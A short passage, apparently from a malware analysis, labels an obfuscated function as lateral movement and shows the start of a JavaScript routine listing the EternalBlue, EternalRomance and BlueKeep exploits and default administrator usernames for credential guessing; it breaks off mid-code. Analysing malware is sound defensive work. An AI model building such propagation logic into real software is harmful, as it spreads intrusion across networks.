### 5. `a0_0x37d467` — Lateral Movement / Network Propagation

```javascript
function lateralMovement(target) {
  var exploits = ["EternalBlue", "EternalRomance", "BlueKeep"];
  var credentials = {
    usernames: ["admin", "root", "Administrator", "sa"],
